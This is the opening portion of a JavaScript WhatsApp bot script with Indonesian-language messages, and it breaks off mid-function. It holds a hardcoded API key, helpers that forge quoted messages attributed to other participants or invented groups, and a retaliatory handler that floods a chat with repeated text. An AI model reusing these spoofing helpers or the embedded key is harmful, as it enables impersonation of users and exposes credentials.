const info_nih_cok =`

Sc ini cuma mau di perbaiki sampai semua fitur work
Abistu boleh beli yg no enc klo ada yg minat 📝

`
const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const toMs = require('ms')
const chalk = require("chalk")
const crypto = require('crypto')
const util = require('util');
const speed = require('performance-now')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const imgbb = require('imgbb-uploader')
const request = require('request')
const fetch = require('node-fetch')
const path = require('path')
const cd = 4.32e+7
const { spawn, exec, execSync } = require("child_process")
const hx = require('hxz-api')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const { webp2mp4File} = require('./lib/webp2mp4')
const { lirikLagu } = require('./lib/lirik.js');
const simple = require('./lib/simple.js')
const { color, bgcolor } = require('./lib/color')
const translate = require('./lib/translate')
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile } = require("./lib/gif.js")
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/aboutuser")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const Exif = require('./lib/exif');
const exif = new Exif();
const { pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const { msgFilter } = require('./lib/antispam')
const premium = require('./lib/premium')
const _sewa = require("./lib/sewa")
const { addVote, delVote } = require('./database/voting/vote')
const afk = require("./lib/afk")
const setTtt = require('./lib/tictactoe.js')
const { yta2, ytv2} = require('./lib/y2mate')
const { yta, ytv, upload } = require('./lib/ytdl')
const menubot = require('./Menu/zeeoneofc.js')
const { wikiSearch } = require('./lib/wiki.js')
const { sewabotkak } = require('./lib/sewabot.js')
const { uploadImages } = require('./lib/uploadimage')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword");
const { addCommands, getJawabanCmd, getSoalCmd, getCommandsPosi, checkCommands, isCreated, deleteCommands } = require('./lib/commands')
const lolkey = '78bd89cd7b4d6205e3e18061' 

			const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
			const _win = JSON.parse(fs.readFileSync('./database/tttwin.json'))
			const _lose = JSON.parse(fs.readFileSync('./database/tttlose.json'))
			const voting = JSON.parse(fs.readFileSync('./database/voting/voting.json'))
			const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
			const setting = JSON.parse(fs.readFileSync('./settings.json'))
			const _user = JSON.parse(fs.readFileSync('./database/user.json'))
			const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
			const _premium = JSON.parse(fs.readFileSync('./database/premium.json'))
			const sewa = JSON.parse(fs.readFileSync('./database/sewa.json'))
			const _level = JSON.parse(fs.readFileSync('./database/level.json'))
			const _afk = JSON.parse(fs.readFileSync('./database/afk.json'))
			const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
			const atro = JSON.parse(fs.readFileSync('./database/ATO.json'))
			const welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
			const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
			const setiker = JSON.parse(fs.readFileSync('./database/stick.json'))
			const audionye = JSON.parse(fs.readFileSync('./database/audio.json'))
			const imagenye = JSON.parse(fs.readFileSync('./database/image.json'))
			const videonye = JSON.parse(fs.readFileSync('./database/video.json'))
			const badword = JSON.parse(fs.readFileSync('./database/badword.json'));
			const grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
			const senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
			let cmdDB = JSON.parse(fs.readFileSync('./database/commands.json'))
			const scommand = JSON.parse(fs.readFileSync('./database/scommand.json')) 
			const imagebb = "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg"

let single = false
let prefa = setting.prefix
let offline = false
let antitrol = true 

let hit_today = []
let blocked = []
let limitawal = "100" 
let namabot = setting.botname
let owner_name = setting.ownername
let owner_number = setting.ownerNumber
let gamewaktu = "3" 
let numbernye = "0" 
let simbolnya = "•"
let petik = '```'
let enter = '\n'
let notnot = `NOTE:${enter}Jika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w`
let url_gif = setting.url_gif
let public_mode = setting. public_mode
let mlistmsg = false 
let multiprefix = true 
let nopref = false
let autovn = false
let ngetik = false
let menusimple = false
let Mloc = false
let autoregister = setting.user_register
let autorespon = setting.autorespon
let thumbnail = fs.readFileSync(`./image/${setting.thumbnail}`)
const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
let winawal = 1 
let loseawal = 1 
let memberwin = 1 
let memberlose = 1 

//=================================================//
module.exports = Zeeone = async (Zeeone, Ofc) => {
	try {
        if (!Ofc.hasNewMessage) return
        Ofc = Ofc.messages.all()[0]
        if (!Ofc.message) return
		if (Ofc.key && Ofc.key.remoteJid == 'status@broadcast') return
		global.blocked
		m = simple.smsg(Zeeone, Ofc)
		let { mentioned } = m
		bail = m.isBaileys
        Ofc.message = (Object.keys(Ofc.message)[0] === 'ephemeralMessage') ? Ofc.message.ephemeralMessage.message : Ofc.message
        const content = JSON.stringify(Ofc.message)
		const from = Ofc.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(Ofc.message)[0]
        const addCmd = (id, command) => {
			const obj = { id: id, chats: command }
			scommand.push(obj)
			fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
			}
			const getCommandPosition = (id) => {
				let position = null
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						position = i
					}
				})
				if (position !== null) {
					return position
				}
			}
			const getCmd = (id) => {
				let position = null
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						position = i
					}
				})
				if (position !== null) {
					return scommand[position].chats
				}
			}
			const checkSCommand = (id) => {
				let status = false
				Object.keys(scommand).forEach((i) => {
					if (scommand[i].id === id) {
						status = true
					}
				})
			return status
		}
        const cmd = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(Ofc.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(Ofc.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(Ofc.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multiprefix){
		var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ''
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
		
        		if ((Object.keys(Ofc.message)[0] === 'ephemeralMessage' && JSON.stringify(Ofc.message).includes('EPHEMERAL_SETTING')) && Ofc.message.ephemeralMessage.message.protocolMessage.type === 3) {
						Zeeone.sendMessage(Ofc.key.remoteJid, `Defak ada yg send bug`, MessageType.text)
						Zeeone.sendMessage(Ofc.key.remoteJid, `Pasti bocil nih`, MessageType.text)
						Zeeone.sendMessage(Ofc.key.remoteJid, `*TANDAI TELAH DI BACA*\n`.repeat(100), MessageType.text)
					}

				
        body = type === "conversation" && Ofc.message.conversation.startsWith(prefix) ? Ofc.message.conversation : type == "imageMessage" && Ofc.message.imageMessage.caption.startsWith(prefix) ? Ofc.message.imageMessage.caption : type == "videoMessage" && Ofc.message.videoMessage.caption.startsWith(prefix) ? Ofc.message.videoMessage.caption : type == "extendedTextMessage" && Ofc.message.extendedTextMessage.text.startsWith(prefix) ? Ofc.message.extendedTextMessage.text : type == "buttonsResponseMessage" && Ofc.message[type].selectedButtonId ? Ofc.message[type].selectedButtonId : type == "stickerMessage" && getCmd(Ofc.message[type].fileSha256.toString("base64")) !== null && getCmd(Ofc.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(Ofc.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? Ofc.message.conversation : (type === 'extendedTextMessage') ? Ofc.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : ''
		chatxs = (type === 'conversation' && Ofc.message.conversation) ? Ofc.message.conversation : (type == 'imageMessage') && Ofc.message.imageMessage.caption ? Ofc.message.imageMessage.caption : (type == 'documentMessage') && Ofc.message.documentMessage.caption ? Ofc.message.documentMessage.caption : (type == 'videoMessage') && Ofc.message.videoMessage.caption ? Ofc.message.videoMessage.caption : (type == 'extendedTextMessage') && Ofc.message.extendedTextMessage.text ? Ofc.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		hit_today.push(command)
        const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = Zeeone.user.jid
		const botNumberss = Zeeone.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = Ofc.key.fromMe ? Zeeone.user.jid : isGroup ? Ofc.participant : Ofc.key.remoteJid
		let bio_nya = await Zeeone.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
		const senderNumber = sender.split("@")[0]
		const ownerNumber = [`${owner_number}@s.whatsapp.net`]
		const isOwner = ownerNumber.includes(sender)
		try {
					pp_userb = await Zeeone.getProfilePicture(sender)
				} catch {
					pp_userb = 'https://i.ibb.co/rvsVF3r/5012fbb87660.png'
				}
			let pp_userz = await getBuffer(pp_userb)
			try {
		hit_total = await fetchJson('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits')
			} catch {
				hit_total = { 
					value : "-"
					}
				}
				hitall = `${hit_total.value}`
		const runti = process.uptime() 
		const runtime2 = `${kyun(runti)}`
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await Zeeone.chats.all()
		const totalgroup = await Zeeone.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await Zeeone.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		const groupMetadata = isGroup ? await Zeeone.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isAntro = isGroup ? atro.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAfkOn = afk.checkAfkUser(sender, _afk)
		const isVote = isGroup ? voting.includes(from) : false
		const isSewa = _sewa.checkSewaGroup(from, sewa)
		const isPremium = isOwner ? true : premium.checkPremiumUser(sender, _premium)
			
		const isBanned = ban.includes(sender)
		const isBadword = isGroup ? grupbadword.includes(from) : false
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = Zeeone.user.phone
		const status = `${public_mode ? 'SELF-MODE' : 'PUBLIC-MODE'}`
		const conts = Ofc.key.fromMe ? Zeeone.user.jid : Zeeone.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = Ofc.key.fromMe ? Zeeone.user.name : conts.notify || conts.vname || conts.name || '-'
		const mentionByTag = type == "extendedTextMessage" && Ofc.message.extendedTextMessage.contextInfo != null ? Ofc.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && Ofc.message.extendedTextMessage.contextInfo != null ? Ofc.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		const processsTime = (timestamp, now) => {
			return moment.duration(now - moment(timestamp * 1000)).asSeconds()} 
	
const getLevelingXp = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
						if (_level[i].id === sender) {
							position = i
							}
					})
if (position !== false) {
			return _level[position].xp
			}
		}

const getLevelingLevel = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			return _level[position].level
			}
		}

const getLevelingId = (sender) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			return _level[position].id
			}
		}

const addLevelingXp = (sender, amount) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
			_level[position].xp += amount
				fs.writeFileSync('./database/level.json', JSON.stringify(_level))
			}
		}

const addLevelingLevel = (sender, amount) => {
			let position = false
				Object.keys(_level).forEach((i) => {
					if (_level[i].id === sender) {
						position = i
							}
					})
if (position !== false) {
				_level[position].level += amount
						fs.writeFileSync('./database/level.json', JSON.stringify(_level))
					}
			}

const addLevelingId = (sender) => {
	const obj = {id: sender, xp: 0, level: 0}
				_level.push(obj)
				fs.writeFileSync('./database/level.json', JSON.stringify(_level))
				}
 const getUserRandomId = () => {
 	return _user[Math.floor(Math.random() * _user.length)].id
 }

const addRegisterUser = (userid, sender, age, bio, time) => {
	const obj = { id: userid, name: sender, age: age, bio: bio, time: time }
	_user.push(obj)
	fs.writeFileSync('./database/user.json', JSON.stringify(_user))
	}

const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
	}

const cekUser = (sender) => {
	let status = false
	Object.keys(_user).forEach((i) => {
		if (_user[i].id === sender) {
			status = true
			}
			})
			return status
			}
			const isUser = cekUser(sender)
					
                   var date = new Date();
var tahun = date.getFullYear();
var bulan1 = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var waktoo = date.getHours();
		switch(hari) {
			case 0: hari = "Minggu"; break;
			case 1: hari = "Senin"; break;
			case 2: hari = "Selasa"; break;
			case 3: hari = "Rabu"; break;
			case 4: hari = "Kamis"; break;
			case 5: hari = "Jum`at"; break;
			case 6: hari = "Sabtu"; break;
			}
		switch(bulan1) {
			case 0: bulan1 = "Januari"; break;
			case 1: bulan1 = "Februari"; break;
			case 2: bulan1 = "Maret"; break;
			case 3: bulan1 = "April"; break;
			case 4: bulan1 = "Mei"; break;
			case 5: bulan1 = "Juni"; break;
			case 6: bulan1 = "Juli"; break;
			case 7: bulan1 = "Agustus"; break;
			case 8: bulan1 = "September"; break;
			case 9: bulan1 = "Oktober"; break;
			case 10: bulan1 = "November"; break;
			case 11: bulan1 = "Desember"; break;
			}
			var tampilTanggal = "" + hari + ", " + tanggal + ", " + bulan1 + ", " + tahun;
				var tampilWaktu = "" + jam + " Jam , " + menit + " Menit , " + detik + " Detik";
            

			const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
			if(time2 < "23:59:00"){
				var ucapannya = `Night 🌚 ${pushname}`
				}
       	 if(time2 < "19:00:00"){
     		   var ucapannya = `Night 🌚 ${pushname}`
				}
     	   if(time2 < "18:00:00"){
     		   var ucapannya = `Afternoon 🌅 ${pushname}`
				}
      	  if(time2 < "15:00:00"){
     		   var ucapannya = `GoodDay 🌞 ${pushname}`
				}
    	    if(time2 < "11:00:00"){
       		 var ucapannya = `Morning 🌄 ${pushname}`
				}
    	    if(time2 < "05:00:00"){
  		      var ucapannya = `Night 🌚 ${pushname}`
				}
				mess = {
					wait: 'Proses Kak Tunggu Sebentar..',
					limit: 'Limit kamu habis lord , Silahkan beli dengan #buylimit <nominal> atau minta gift dari user lain',
					sewabot: ` 「 *SEWA BOT* 」 \n\nBerikut list sewa bot kami

•> 25k / BULAN (PREMIUM)
Isi sendiri

Minat? Pm wa.me/${owner_number}`,
					ban: 'Maaf Lord Nomor Kamu Sudah Di Banned!',
					error: 'Error Lord, Mungkin Lagi Diperbaiki',
					errorLink: 'Link Error Lord',
					succes: '```[ ✓ ]``` Sukses Lord',
					only: {
						personal: 'Only Private Chat Lord',
						admin: 'Khusus Admin Group Lord',
						group: 'Khusus Dalam Grup Lord',
						 prem: 'Khusus User Premium Lord',
						owner: 'Khusus Owner Bot Lord',
						 }
					} 
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumbnail, surface: 200, message: `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`,jpegThumbnail: thumbnail}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, "h": `Hmm`,'seconds': '99999', 'caption': `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, 'jpegThumbnail': thumbnail}}}
		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}` , 'jpegThumbnail': thumbnail}}}}
		const fkontak = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {contactMessage: {displayName: `「 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 」\n${runtime2}`, vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'N:Bot;Lord;Userbot;;\n' + 'FN: SUBSCRIBE YT ZEEONE OFC\n' + 'item1.TEL;waid=62887435047326:+62887435047326\n' + 'item1.X-ABLabel:Telepon\n' + 'END:VCARD'}}}
		const isUrl = (url) => {
				return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
				}
			function parseMention(text = '') {
				return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
				}
			const reply = (teks) => {
				return Zeeone.sendMessage(from, teks, text, {quoted: Ofc, contextInfo: { mentionedJid: parseMention(teks) }})
				}
			const sendImage = (teks) => {
				Zeeone.sendMessage(from, teks, image, {quoted:Ofc})
				 }
			 function randomNomor(angka){
				 return Math.floor(Math.random() * angka) + 1
				}
			function pickRandom(arr) {
				return arr[Math.floor(Math.random() * arr.length)]
				}
			const nebal = (angka) => {
				return Math.floor(angka)
				}
			const sendMess = (hehe, teks) => {
				Zeeone.sendMessage(hehe, teks, text)
				}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? Zeeone.sendMessage(from, {text: teks.trim(), jpegThumbnail: thumbnail}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : Zeeone.sendMessage(from, {text: teks.trim(), jpegThumbnail: thumbnail}, extendedText, { sendEphemeral: true, quoted: Ofc, contextInfo: { "mentionedJid": memberr } })
				}
			const getUserrRandomId = () => {
				return _user[Math.floor(Math.random() * _user.length)].id
				}
				const sendTextWithMentions = (teks, member, id) => {
				(id == null || id == undefined || id == false) ? Zeeone.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": member } }) : Zeeone.sendMessage(from, teks.trim(), extendedText, { quoted: Ofc, contextInfo: { "mentionedJid": member } })
				} 
			function monospace(string) {
				return '```' + string + '```'
				}   
			const hideTag = async function(from, text){
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, text, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
				}  
			const sendMention = async(from, text, mentioned, quoted = "") => {
				Zeeone.sendMessage(from, text, text, { quoted: quoted, contextInfo: { mentionedJid: [mentioned] } })
				 }
			const hideTagStiker = async(from, buffer) => {
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, buffer, sticker, { sendEphemeral: true, contextInfo: { mentionedJid: ane } })
				}
		const promoteAdmin = async function(to, target=[]){
				if(!target.length > 0) { return  reply("No target..") }
				let g = await Zeeone.groupMetadata(to)
				let owner = g.owner.replace("c.us","s.whatsapp.net")
				let me = Zeeone.user.jid
				for (i of target){
					if (!i.includes(me) && !i.includes(owner)){
						const res = await Zeeone.groupMakeAdmin(to, [i])
						 }else{
							reply("NOT PREMITED")
						}
					}
				}
			const demoteAdmin = async function(to, target=[]){
					if(!target.length > 0) { return  reply("No target..") }
					let g = await Zeeone.groupMetadata(to)
					let owner = g.owner.replace("c.us","s.whatsapp.net")
					let me = Zeeone.user.jid
					for (i of target){
						if (!i.includes(me) && !i.includes(owner)){
							const res = await Zeeone.groupDemoteAdmin(to, [i])
							} else {
								reply("NOT PREMITED")
							}
						}
					}
			const kickMember = async(id, target = []) => {
					let group = await Zeeone.groupMetadata(id)
					let owner = group.owner.replace("c.us", "s.whatsapp.net")
					let me = Zeeone.user.jid
					for (i of target) {
						if (!i.includes(me) && !i.includes(owner)) {
							await Zeeone.groupRemove(to, [i])
							} else {
								await Zeeone.sendMessage(id, "Not Premited!", "conversation")
							}
						}
					}
			const kick = function(from, orangnya){
				for (let i of orangnya){
					Zeeone.groupRemove(from, [i])
				}
			}
			const add = function(from, orangnya){
					Zeeone.groupAdd(from, orangnya)
				}
			const sendKontak = (from, nomor, nama, org = "") => {
				const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
				Zeeone.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: Ofc})
			}
			const hideTagKontak = async(from, nomor, nama) => {
				vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
				let anu = await Zeeone.groupMetadata(from)
				let members = anu.participants
				let ane = []
				for (let i of members){
					ane.push(i.jid)
					}
					Zeeone.sendMessage(from, { displayname: nama, vcard: vcard }, contact, { contextInfo: { mentionedJid: ane } })
				}
			const sendFileFromStorage = (path, type, options) => {
				Zeeone.sendMessage(from, fs.readFileSync(path), type, options).catch(e => {
					reply('Terjadi kesalahan')
					console.log(e)
				})
			}
			const getGroup = async function(totalchat){
				let grup = []
				let a = []
				let b = []
				for (c of totalchat){
					a.push(c.jid)
				}
				for (d of a){
					if (d && d.includes('g.us')){
						b.push(d)
					}
				}
				for (e of b){
					let ingfo = await Zeeone.groupMetadata(e)
					grup.push(ingfo)
					}
					return grup
				}
				
				const fakeReply = (teks, target, teks2) => {
					Zeeone.sendMessage(from, teks, text, {quoted: {key: {fromMe: false, participant: `${target}@s.whatsapp.net`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: teks2}}})
				}
				let authorname = Zeeone.contacts[from] != undefined ? Zeeone.contacts[from].vname || Zeeone.contacts[from].notify : undefined	
				if (authorname != undefined) { } else { authorname = groupName }	
					function addMetadata(packname, author) {	
						if (!packname) packname = 'self'; if (!author) author = 'Zeeone';author = author.replace(/[^a-zA-Z0-9]/g, '');	
						let name = `${author}_${packname}`
						if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
				let len = JSON.stringify(json).length	
				let last	
				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)
					} else {
						bytes.unshift(0x00)	
					}	
				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
					} else {	
						last = len.toString(16)	
					}	
				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
				fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
					return `./sticker/${name}.exif`	
					})	
				}
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './sticker' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './sticker' + names + '.png'
                    let asw = './sticker' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Zeeone.sendMessage(to, media, MessageType.sticker,{quoted:Ofc})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const sendFileFromUrlF = async(link, type, options) => {
            	hasil = await getBuffer(link)
            Zeeone.sendMessage(from, hasil, type, options).catch(e => {
            	fetch(link).then((hasil) => {
            	Zeeone.sendMessage(from, hasil, type, options).catch(e => {
            	Zeeone.sendMessage(from, { url : link }, type, options).catch(e => {
            	fakegroup('Something Error')
            console.log(e)
            })
            })
            })
            })
           }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
